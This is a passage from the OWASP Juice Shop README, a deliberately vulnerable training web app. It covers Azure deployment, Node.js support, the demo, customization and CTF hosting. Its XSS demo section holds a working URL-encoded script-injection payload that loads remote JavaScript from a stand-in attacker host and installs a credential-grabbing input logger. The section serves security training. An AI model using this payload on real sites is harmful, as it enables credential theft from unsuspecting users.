OWASP Juice Shop is probably the most modern and sophisticated insecure
web application! It can be used in security trainings, awareness demos,
CTFs and as a guinea pig for security tools! Juice Shop encompasses
vulnerabilities from the entire
[OWASP Top Ten](https://www.owasp.org/index.php/OWASP_Top_Ten) along
with many other security flaws found in real-world applications!

   [Azure CLI](https://azure.github.io/projects/clis/) **or** login to
   the [Azure Portal](https://portal.azure.com), open the _CloudShell_
   and then choose _Bash_ (not PowerShell).
2. Create a resource group by running `az group create --name <group
   name> --location <location name, e.g. "centralus">`
3. Create a new container by running `az container create
   --resource-group <group name> --name <container name> --image
   bkimminich/juice-shop --dns-name-label <dns name label> --ports 3000
   --ip-address public`
4. Your container will be available at `http://<dns name
   label>.<location name>.azurecontainer.io:3000`

## Node.js version compatibility

OWASP Juice Shop officially supports the following versions of
[node.js](http://nodejs.org) in line as close as possible with the
official [node.js LTS schedule](https://github.com/nodejs/LTS). Docker
images and packaged distributions are offered accordingly:

| node.js  | [Docker image](https://registry.hub.docker.com/u/bkimminich/juice-shop)             | [Packaged distributions](https://github.com/bkimminich/juice-shop/releases/latest)         |
|:---------|:------------------------------------------------------------------------------------|:-------------------------------------------------------------------------------------------|
| 11.x     |                                                                                     | `juice-shop-<version>_node11_windows_x64.zip`, `juice-shop-<version>_node11_linux_x64.tgz` |
| __10.x__ | __`latest`__ (current official release), `snapshot` (preview from `develop` branch) | `juice-shop-<version>_node10_windows_x64.zip`, `juice-shop-<version>_node10_linux_x64.tgz` |
| 9.x      |                                                                                     | `juice-shop-<version>_node9_windows_x64.zip`, `juice-shop-<version>_node9_linux_x64.tgz`   |
| 8.x      |                                                                                     | `juice-shop-<version>_node8_windows_x64.zip`, `juice-shop-<version>_node8_linux_x64.tgz`   |

## Demo [![Heroku](https://heroku-badge.herokuapp.com/?app=juice-shop)](http://demo.owasp-juice.shop)

Feel free to have a look at the latest version of OWASP Juice Shop:
<http://demo.owasp-juice.shop>

> This is a deployment-test and sneak-peek instance only! You are __not
> supposed__ to use this instance for your own hacking endeavours! No
> guaranteed uptime! Guaranteed stern looks if you break it!

## Customization

Via a YAML configuration file in `/config`, the OWASP Juice Shop can be
customized in its content and look & feel.

For detailed instructions and examples please refer to
[our _Customization_ documentation](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part1/customization.html).

## CTF-Extension

If you want to run OWASP Juice Shop as a Capture-The-Flag event, we
recommend you set it up along with a [CTFd](https://ctfd.io) server
conveniently using the official
[`juice-shop-ctf-cli`](https://www.npmjs.com/package/juice-shop-ctf-cli)
tool.

For step-by-step instructions and examples please refer to
[the _Hosting a CTF event_ chapter](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part1/ctf.html)
of our companion guide ebook.

## XSS Demo

To show the possible impact of
[XSS](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)), you
can download this
[docker-compose](https://raw.githubusercontent.com/wurstbrot/shake-logger/master/docker-compose.yml)-file
and run `docker-compose up` to start the juice-shop and the
shake-logger. Assume you received and (of course) clicked
[this inconspicuous phishing link](http://localhost:3000/#/search?q=%3Cimg+src%3Dx+onerror%3D%27var+js%3Ddocument.createElement%28%22script%22%29%3Bjs.type+%3D+%22text%2Fjavascript%22%3Bjs.src%3D%22http%3A%2F%2Flocalhost%3A8080%2Fshake.js%22%3Bdocument.body.appendChild%28js%29%3Bvar+hash%3Dwindow.location.hash%3Bwindow.location.hash%3Dhash.substr%280%2C8%29%3B%27%2F%3Eapple)
and login. Apart from the visual/audible effect, the attacker also
installed [an input logger](http://localhost:8080/logger.php) to grab
credentials! This could easily run on a 3rd party server in real life!

> We recommend to use Mozilla Firefox for this demo! You can also find a
> recording of this attack in action on YouTube:
